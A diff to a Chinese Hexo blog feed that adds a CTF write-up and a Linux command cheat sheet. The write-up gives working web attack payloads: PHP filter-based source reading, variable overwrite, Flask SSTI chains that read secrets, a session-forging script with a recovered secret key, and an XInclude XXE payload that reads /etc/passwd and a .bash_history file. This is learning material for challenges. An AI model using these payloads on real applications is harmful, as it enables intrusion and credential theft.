+        <content type="html"><![CDATA[<h1 id="myblog"><a href="#myblog" class="headerlink" title="myblog"></a>myblog</h1><blockquote><p>十足的脑洞题！=-=<br>访问index.php响应头中发现提示信息：<code>?flag</code><br><img src="https://upload-images.jianshu.io/upload_images/6934571-ad0d75baf10ead53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>php://filter实现文件读取<br>php://filter/convert.base64-encode/resource=index获得index.php源码。</p></blockquote><pre><code>&lt;?php     header(&#39;flag: JTNGZmxhZw==&#39;);    if(isset($_GET[&quot;flag&quot;])){        $flag = $_GET[&quot;flag&quot;];        include $flag.&quot;.php&quot;;    }?&gt;</code></pre><blockquote><p>rbl=-=<br>题目一直给的提示也是云里雾里<br>about，base64编码–&gt;YWJvdXQ=<br>访问<a href="http://58.20.46.150:26293/YWJvdXQ=.php" target="_blank" rel="noopener">http://58.20.46.150:26293/YWJvdXQ=.php</a> 200！！！<br>读源码：</p></blockquote><pre><code>&lt;?php    $filename = &#39;flag.txt&#39;;    $flag = &#39;flag.txt&#39;;    extract($_GET);    if(isset($sign)){        $file = trim(file_get_contents($filename));        if($sign === $file){            echo &#39;Congratulation!&lt;br&gt;&#39;;            echo file_get_contents($$falg);        }        else{            echo &#39;don`t give up&#39;;        }    }?&gt;</code></pre><blockquote><p>变量覆盖,获取flag<br><img src="https://upload-images.jianshu.io/upload_images/6934571-eb76feb39205dad8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p></blockquote><h1 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h1><blockquote><ul><li>提示信息：flask,/upload<br>访问upload提示需要admin登录<br>尝试flask ssti<br><img src="https://upload-images.jianshu.io/upload_images/6934571-67c46faafce16259.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>思路目前已经比较明确了<br>利用ssti读取secretkey伪造session，让自身变为admin访问/upload</li></ul></blockquote><blockquote><ul><li>ssti利用<br>参考文章：<a href="http://shaobaobaoer.cn/archives/665/tokyo-westerns-ctf-2018-web-wp" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/665/tokyo-westerns-ctf-2018-web-wp</a><ul><li>没有 WAF 的情况<br>config：<code></code><br>self：<code></code><br>()：只要找一个有 os 的 subclasses</li></ul></li></ul></blockquote><pre><code>().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).__dict__.environ[&#39;FLAG&#39;]().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).__dict__.environ[&#39;FLAG&#39;]## 作者给的; &lt;type &#39;dict_keys&#39;&gt; 里本身就有 OS[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#39;os&#39;].__dict__.environ[&#39;FLAG&#39;]</code></pre><blockquote><ul><li>当config,self,( ) 都被过滤的时候，为了去获得讯息，必须去读一些全局变量。<br>比如：current_app<br><code>__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]</code><br><code>top.app.config[&#39;FLAG&#39;]</code></li></ul></blockquote><blockquote><p>如何绕过waf ? url_for 调取 current_app<br>首先，介绍一个很牛逼的函数，叫做url_for,可以参考flask的官方文档 <a href="http://flask.pocoo.org/docs/1.0/api/#flask.url_forbaobaoer.cn/archives/656/python-b2e7b180e9b880e793" target="_blank" rel="noopener">flask.url_for</a><br>在它引用的内容中，有着 current_app 的全局变量</p></blockquote><blockquote><p>如何绕过waf ? get_flashed_messages 调取 current_app<br>除此之外，还有函数包含了 current_app ，叫做 get_flashed_messages ，同样，可以参考官方文档 <a href="http://flask.pocoo.org/docs/1.0/api/#flask.get_flashed_messages" target="_blank" rel="noopener">flask.get_flashed_messages</a></p></blockquote><p>因此本题通过访问<br><code>http://58.20.46.150:25524/</code><br>成功获取secretkey：<code>as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf</code></p><blockquote><ul><li>之后我们就可以开始伪造session<br>参考文章：<a href="https://s0cket7.com/picoctf-web/" target="_blank" rel="noopener">https://s0cket7.com/picoctf-web/</a><br>注册一个账号并登陆<br>将session 解码之后：<br><code>{u&#39;csrf_token&#39;: &#39;0c571097c78ee172ee45dc8040bfc51a8097bb5f&#39;, u&#39;user_id&#39;: u&#39;174&#39;, u&#39;name&#39;: u&#39;shy&#39;, u&#39;_fresh&#39;: True, u&#39;is_admin&#39;: False, u&#39;_id&#39;: &#39;03ecc0c802a927210d305104e208baf9d9ca3e66c0e8a30ac70d0acf8a8e8be3cba606a3589426385324a67ad8824715cfc97260e3be80e11d894a01fb92d498&#39;}</code><br>目的是伪造成admin，因此重构session如下：<br><code>{u&#39;csrf_token&#39;: &#39;0c571097c78ee172ee45dc8040bfc51a8097bb5f&#39;, u&#39;user_id&#39;: u&#39;174&#39;, u&#39;name&#39;: u&#39;admin&#39;, u&#39;_fresh&#39;: True, u&#39;is_admin&#39;: u&#39;True&#39;, u&#39;_id&#39;: &#39;03ecc0c802a927210d305104e208baf9d9ca3e66c0e8a30ac70d0acf8a8e8be3cba606a3589426385324a67ad8824715cfc97260e3be80e11d894a01fb92d498&#39;}</code><br>重新编码之后为：<br><code>.eJxFkEGLwjAUhP_K8s49NLWyIHiwpCsVXoKQVZJL0VqbNokLrZI14n_frHvY0_CGeR_MPKA-j-2kYXEdb20CdX-CxQPejrAApMzKDL0MnUdXznFo7igKg2FFUKxSJSrP1xutBmv4nmnMPjPm0CuhNYZCy9B4RaNmMpdC25i1mLFeCumZKwMT3ZzRKsPQEQxVGv2Z3G9zTquUhZLITA1cNHc2FPFvYzmNKj4MpyZmV9_KVXN025SLbgnPBJppPNfXL9Ne_iuskUSU5-I0sKCtEuUM3c4yujO_tRgteuWQ4L7MkZqZdBVR3fKF66f6cHJ9hIGI20ACl4Nr4_XnJnCb2vG1F5D3HJ4_ROJrEQ.XANE-Q.9uWmYKvMMY_5eYLIeKbhSicbLRk</code><br>替换cookie，访问/upload成功</li></ul></blockquote><p>脚本如下：</p><pre><code>from flask.sessions import SecureCookieSessionInterfacefrom itsdangerous import URLSafeTimedSerializerimport sysclass CookieSessionInterface(SecureCookieSessionInterface):  def __init__(self, secret_key):    self.secret_key = secret_key    if not secret_key:      return None    signer_kwargs = dict(      key_derivation=self.key_derivation,      digest_method=self.digest_method    )    self.sign_serializer = URLSafeTimedSerializer(secret_key, salt=self.salt,                                  serializer=self.serializer,                                  signer_kwargs=signer_kwargs)  def decode(self, cookie):    return self.sign_serializer.loads(cookie)  def encode(self, cookie):    return self.sign_serializer.dumps(cookie)if __name__==&#39;__main__&#39;:    secret = &#39;as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf&#39;    cookie = sys.argv[1]    csi = CookieSessionInterface(secret)    decoded_cookie = csi.decode(cookie)    print &quot;* ORIGINAL COOKIE:&quot;, decoded_cookie    decoded_cookie[&#39;is_admin&#39;] = u&quot;True&quot;    decoded_cookie[&#39;name&#39;] = u&quot;admin&quot;    print &quot;* MODIFIED COOKIE&quot;, decoded_cookie    new_cookie = csi.encode(decoded_cookie)    print &quot;+ MODIFIED SECRET ENCODED COOKIE:&quot;, new_cookie</code></pre><blockquote><ul><li>/upload为一个上传页面，随意上传文件500=-=<br>迷……<br>然后发现<br><img src="https://upload-images.jianshu.io/upload_images/6934571-ecb8d647eeb03d84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li></ul></blockquote><blockquote><ul><li>尝试xxe，测试发现禁用了<code>&lt;!ENTITY</code>，<code>&lt;!DOCTYPE</code><br><img src="https://upload-images.jianshu.io/upload_images/6934571-57874dc0a401b99c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>搜索了一波xxe payload，测试发现可以用xinclude<br>payload:</li></ul></blockquote><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;&lt;/root&gt;</code></pre><blockquote><p><img src="https://upload-images.jianshu.io/upload_images/6934571-34e86d6f4f6723ed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>不能列目录，有点懵~<br>发现其中有一个rq用户比较可疑<br>尝试读取/home/rq/.bash_history<br><img src="https://upload-images.jianshu.io/upload_images/6934571-05f636863033109f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>读取flag<br><img src="https://upload-images.jianshu.io/upload_images/6934571-74d09a274e027a20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> writeup </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> writeup </tag>
+            
+            <tag> flask ssti </tag>
+            
+            <tag> xxe </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>linux tips</title>
+      <link href="/2018/11/26/linux-tips/"/>
+      <url>/2018/11/26/linux-tips/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Linux下查看文件内容的命令"><a href="#Linux下查看文件内容的命令" class="headerlink" title="Linux下查看文件内容的命令"></a>Linux下查看文件内容的命令</h1><blockquote><p>查看文件内容的命令：<br>cat     由第一行开始显示内容，并将所有内容输出<br>tac     从最后一行倒序显示内容，并将所有内容输出<br>more    根据窗口大小，一页一页的现实文件内容<br>less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head    只显示头几行<br>tail    只显示最后几行<br>nl      类似于cat -n，显示时输出行号<br>tailf   类似于tail -f<br>##ssh<br>ssh &lt;-p 端口&gt; 用户名@IP</p></blockquote><h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><blockquote><p>scp 文件路径  用户名@IP:存放路径　<br>从本地服务器复制到远程服务器：<br>(1) 复制文件：<br>命令格式：<br>scp local_file remote_username@remote_ip:remote_folder<br>或者<br>scp local_file remote_username@remote_ip:remote_file<br>或者<br>scp local_file remote_ip:remote_folder<br>或者<br>scp local_file remote_ip:remote_file<br>第1,2个指定了用户名，命令执行后需要输入用户密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名<br>第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名<br>(2) 复制目录：<br>命令格式：<br>scp -r local_folder remote_username@remote_ip:remote_folder<br>或者<br>scp -r local_folder remote_ip:remote_folder<br>第1个指定了用户名，命令执行后需要输入用户密码；<br>第2个没有指定用户名，命令执行后需要输入用户名和密码；</p></blockquote><h1 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h1><blockquote><p>tar –xvf file.tar         // 解压 tar包<br>tar -zxvf file.tar.gz     // 解压tar.gz<br>tar -jxvf file.tar.bz2    // 解压 tar.bz2<br>tar –Zxvf file.tar.Z      // 解压tar.Z  </p></blockquote><blockquote><p>tar –cvf jpg.tar *.jpg     // 将目录里所有jpg文件打包成tar.jpg<br>tar –czf jpg.tar.gz *.jpg  // 将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz<br>tar –cjf jpg.tar.bz2 *.jpg // 将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2<br>tar –cZf jpg.tar.Z *.jpg   // 将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z  </p></blockquote><h1 id="w"><a href="#w" class="headerlink" title="w"></a>w</h1><blockquote><p>w命令–&gt;用来查看登录者的信息及他们的行为。<br>User：登录用户名<br>TTY：登录后系统分配的终端号<br>From：远程主机名，即从哪登录的<br>login@：何时登录<br>IDLE：用户空闲时间。这是个计时器，一旦用户执行任何操作，改计时器就会被重置。<br>JCPU：和终端连接的所有进程占用时间。包括当前正在运行的后台作业占用时间<br>PCPU：当前进程所占用时间<br>WHAT：当前正在运行进程的命令行</p></blockquote><blockquote><p>与其他命令比较</p><p>1) 区别于who命令，w命令不仅可以看到登录服务器的用户信息，而且可以看到这些用户做了什么<br>2) who am i命令，显示出自己在系统中的用户名，登录终端，登录时间<br>3) whoami命令，显示自己在系统中的用户名<br>4) logname命令，可以显示自己初次登录到系统中的用户名，主要识别sudo前后情形<br>5) last命令，查看最近1个月用户登录服务器的情况<br>6) tty命令，来查看所连接的设备或终端</p></blockquote><h1 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h1><blockquote><p>列出所有端口 netstat -a<br>列出所有 tcp 端口 netstat -at<br>列出所有 udp 端口 netstat -au<br>只显示监听端口 netstat -l<br>只列出所有监听 tcp 端口 netstat -lt<br>只列出所有监听 udp 端口 netstat -lu<br>只列出所有监听 UNIX 端口 netstat -lx</p></blockquote><h2 id="查看已建立的网络连接及进程"><a href="#查看已建立的网络连接及进程" class="headerlink" title="查看已建立的网络连接及进程"></a>查看已建立的网络连接及进程</h2><p><code>netstat -antulp | grep EST</code></p><h2 id="查看指定端口被哪个进程占用"><a href="#查看指定端口被哪个进程占用" class="headerlink" title="查看指定端口被哪个进程占用"></a>查看指定端口被哪个进程占用</h2><p><code>lsof -i:端口号</code>或者 <code>netstat -tunlp | grep 端口号</code></p><h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><blockquote><p>ps命令能提供一份当前进程的快照。如果想状态可以自动刷新，可以使用top命令。<br>显示所有运行中的进程：ps aux | less<br>-A：显示所有进程<br>a：显示终端中包括其它用户的所有进程<br>x：显示无控制终端的进程<br>查看非root运行的进程：ps -U root -u root -N</p></blockquote><blockquote><p><code>ps -aux | grep pid或者进程名</code><br>ps -aux | grep tomcat</p></blockquote><blockquote><p>结束进程命令<br>kill PID<br>killall &lt;进程名&gt;　　<br>kill -9 <PID>　</PID></p></blockquote><h2 id="使用ps命令，分析进程"><a href="#使用ps命令，分析进程" class="headerlink" title="使用ps命令，分析进程"></a><code>使用ps命令，分析进程</code></h2><blockquote><p>ps aux | grep pid | grep –v grep<br>可以使用<code>lsof -i:1677</code> 查看指定端口对应的程序</p></blockquote><h1 id="封杀某个IP或者ip段"><a href="#封杀某个IP或者ip段" class="headerlink" title="封杀某个IP或者ip段"></a>封杀某个IP或者ip段</h1><blockquote><p>如：<br>iptables -I INPUT -s 123.45.6.7 -j DROP       #屏蔽单个IP的命令<br>iptables -I INPUT -s 123.0.0.0/8 -j DROP      #封整个段即从123.0.0.1到123.255.255.254的命令<br>禁止从某个主机ssh远程访问登陆到本机，如　<br>iptable -t filter -A INPUT -s . -p tcp –dport  -j DROP　<br>iptables -I INPUT -s 123.45.6.7 -j ACCEPT</p><p>查看已添加的iptables规则<br>iptables -L -n -v</p><p>删除已添加的iptables规则<br>将所有iptables以序号标记显示，执行：<br>iptables -L -n –line-numbers<br>比如要删除INPUT里序号为8的规则，执行：<br>iptables -D INPUT 8</p></blockquote><h1 id="mysql备份"><a href="#mysql备份" class="headerlink" title="mysql备份"></a>mysql备份</h1><blockquote><p>mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　　　<br>mysqldump –all-databases &gt; bak.sql　　　　　　<br>还原mysql数据库<br>mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql　</p></blockquote><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><blockquote><p>在/home目录下查找以.txt结尾的文件名<br><code>find /home -name &quot;*.txt&quot;</code><br><code>find /home -iname &quot;*.txt&quot;</code>    忽略大小写</p><p>当前目录及子目录下查找所有以.txt和.pdf结尾的文件<br>find . ( -name “<em>.txt” -o -name “</em>.pdf” )<br>或<br>find . -name “<em>.txt” -o -name “</em>.pdf” </p></blockquote><h1 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h1><blockquote><p><code>awk -F&quot;:&quot; &#39;{print $1}&#39;  /etc/passwd</code><br><code>awk -F: &#39;{print $1; print $2}&#39;   /etc/passwd</code>               //将每一行的前二个字段，分行输出，进一步理解一行一行处理文本<br><code>awk  -F: &#39;{print $1,$3,$6}&#39; OFS=&quot;\t&quot; /etc/passwd</code>      //输出字段1,3,6，以制表符作为分隔符</p><p>查看UID为0的帐号：<code>awk -F: &#39;{if($3==0)print $1}&#39; /etc/passwd</code><br>##crontab<br>指定包含待执行任务的crontab文件<br>sudo crontab -l -u www-data<br>sudo crontab -r -u www-data</p></blockquote><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><blockquote><p>列出ls中所有的ASCII文本：<br>strings /bin/ls<br>列出ls中所有的ASCII文本：<br>cat /bin/ls strings<br>查找ls中包含libc的字符串，不区分大小写：<br><code>strings /bin/ls | grep -i libc</code></p></blockquote><h1 id="查看页面访问排名前十的IP"><a href="#查看页面访问排名前十的IP" class="headerlink" title="查看页面访问排名前十的IP"></a>查看页面访问排名前十的IP</h1><p>cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　<br>##查看页面访问排名前十的URL<br>cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -</p><h1 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h1><h2 id="敏感目录的文件分析"><a href="#敏感目录的文件分析" class="headerlink" title="敏感目录的文件分析"></a>敏感目录的文件分析</h2><blockquote><p>查看tmp目录下的文件： ls –alt /tmp/<br>查看开机启动项内容：ls -alt /etc/init.d/<br>查看指定目录下文件时间的排序：ls  -alt  | head -n 10</p><p>针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有   线性关联，说明可能被篡改或者其他。</p></blockquote><h2 id="新增文件分析"><a href="#新增文件分析" class="headerlink" title="新增文件分析"></a>新增文件分析</h2><blockquote><p>例如要查找24小时内被修改的php文件： <code>find ./ -mtime 0 -name &quot;*.php&quot;</code><br>（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）<br>查找72小时内新增的文件<code>find / -ctime -2</code><br>PS：-ctime 内容未改变权限改变时候也可以查出<br>根据确定时间去反推变更的文件<br><code>ls -al /tmp | grep &quot;Feb 27&quot;</code></p></blockquote><h2 id="特殊权限的文件"><a href="#特殊权限的文件" class="headerlink" title="特殊权限的文件"></a>特殊权限的文件</h2><blockquote><p>查找777的权限的文件   find  /  *.jsp  -perm 4777  </p><p>隐藏的文件（以 “.”开头的具有隐藏属性的文件）</p><p>在文件分析过程中，手工排查频率较高的命令是 find grep ls 核心目的是为了关联推理出可疑文件。</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 备忘录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+            <tag> tips </tag>
+            
         </tags>
       
     </entry>
@@ -123,6 +397,8 @@
         <tags>
             
             <tag> hexo </tag>
+            
+            <tag> tips </tag>
             
         </tags>
       
